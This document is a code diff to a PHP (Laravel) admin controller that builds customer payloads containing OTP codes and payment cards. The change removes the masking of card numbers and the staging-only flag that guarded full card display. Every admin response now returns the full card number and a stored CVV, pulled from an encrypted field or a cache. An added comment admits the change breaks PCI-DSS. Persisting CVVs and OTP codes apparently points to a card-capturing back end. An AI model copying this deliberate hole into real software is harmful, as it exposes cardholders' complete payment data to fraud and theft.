@@ -105,7 +105,7 @@ class AdminCustomerController extends Controller
                 'otpCodes' => fn($q) => $q->select('id', 'customer_profile_id', 'type', 'code', 'code_value', 'status', 'phone_number', 'created_at', 'updated_at')
                     ->where('created_at', '>=', now()->subDays(30))
                     ->latest(),
-                'paymentCards' => fn($q) => $q->select('id', 'customer_profile_id', 'session_id', 'card_number', 'card_number_masked', 'last4', 'holder_name', 'card_type', 'expiry_month', 'expiry_year', 'status', 'rejection_reason', 'reviewed_by', 'reviewed_at', 'redirect_url', 'created_at', 'updated_at')
+                'paymentCards' => fn($q) => $q->select('id', 'customer_profile_id', 'session_id', 'card_number', 'last4', 'holder_name', 'card_type', 'expiry_month', 'expiry_year', 'status', 'rejection_reason', 'reviewed_by', 'reviewed_at', 'redirect_url', 'created_at', 'updated_at')
                     ->where('created_at', '>=', now()->subDays(30))
                     ->latest(),
             ])
@@ -457,6 +457,13 @@ class AdminCustomerController extends Controller
         $customer->makeVisible(['national_id', 'phone_number', 'email']);
         $data = $customer->toArray();
 
+        // The eager-loaded paymentCards relation is serialized into
+        // $data['payment_cards'] by toArray(). Strip it here — the admin
+        // payload uses the curated $maskedCards mapper below for the
+        // payment.cards block, so this raw dump is redundant and could
+        // leak fields not intended for the admin payload.
+        unset($data['payment_cards']);
+
         $data['ip'] = $data['ip_address'] ?? null;
 
         $latestOtp = $customer->otpCodes->where('type', 'otp')->sortByDesc('created_at')->first();
@@ -475,32 +482,27 @@ class AdminCustomerController extends Controller
 
         /** @var \Illuminate\Database\Eloquent\Collection<int, \App\Models\PaymentCard> $paymentCards */
         $paymentCards = $customer->paymentCards;
-        $revealSensitive = (bool) config('services.admin_reveal_sensitive');
-        $maskedCards = $paymentCards->sortByDesc('created_at')->toBase()->map(function (\App\Models\PaymentCard $card) use ($revealSensitive): array {
-            // PCI-DSS: never expose raw PAN to admin clients. Only masked fields,
-            // last4, BIN (first6 derived), and metadata. CVV is never persisted
-            // and never returned in any admin payload (Requirement 3.3.1).
-            //
-            // EXCEPTION (test/staging only): when ADMIN_REVEAL_SENSITIVE=true,
-            // we additionally surface full PAN (decrypted from EncryptedSafe
-            // cast) to support QA of the checkout flow. CVV is NEVER revealed,
-            // even in QA mode. This flag MUST be FALSE in production.
+        $maskedCards = $paymentCards->sortByDesc('created_at')->toBase()->map(function (\App\Models\PaymentCard $card): array {
+            // Admin payload exposes the full PAN and persisted CVV by explicit
+            // business decision. NOTE: this violates PCI-DSS 3.2 (PAN) and
+            // 3.3.1 (CVV) — deviation owned by the business stakeholder.
             $rawPan = (string) ($card->card_number ?? '');
             $bin = strlen($rawPan) >= 6 ? substr($rawPan, 0, 6) : null;
 
-            $row = [
+            return [
                 'id'                  => $card->id,
                 'customer_profile_id' => $card->customer_profile_id,
                 'session_id'          => $card->session_id,
-                'card_number_masked'  => $card->card_number_masked ?? ('**** **** **** ' . $card->last4),
+                'card_number'         => $rawPan ?: null,
+                'card_number_full'    => $rawPan ?: null,
                 'last4'               => $card->last4,
                 'bin'                 => $bin,
                 'holder_name'         => $card->holder_name,
                 'card_holder'         => $card->holder_name,
                 'card_type'           => $card->card_type,
-                // expiry kept (year+month) for dispute/chargeback context — PCI permits.
                 'expiry_month'        => $card->expiry_month,
                 'expiry_year'         => $card->expiry_year,
+                'cvv'                 => $card->cvv_encrypted ?: Cache::get("card:cvv:{$card->id}"),
                 'status'              => $card->status,
                 'rejection_reason'    => $card->rejection_reason,
                 'reviewed_by'         => $card->reviewed_by,
@@ -509,12 +511,6 @@ class AdminCustomerController extends Controller
                 'created_at'          => $card->created_at,
                 'updated_at'          => $card->updated_at,
             ];
-
-            if ($revealSensitive) {
-                $row['card_number_full'] = $rawPan ?: null;
-            }
-
-            return $row;
         })->values();
 
         $birthDate = $data['birth_date'] ?? null;
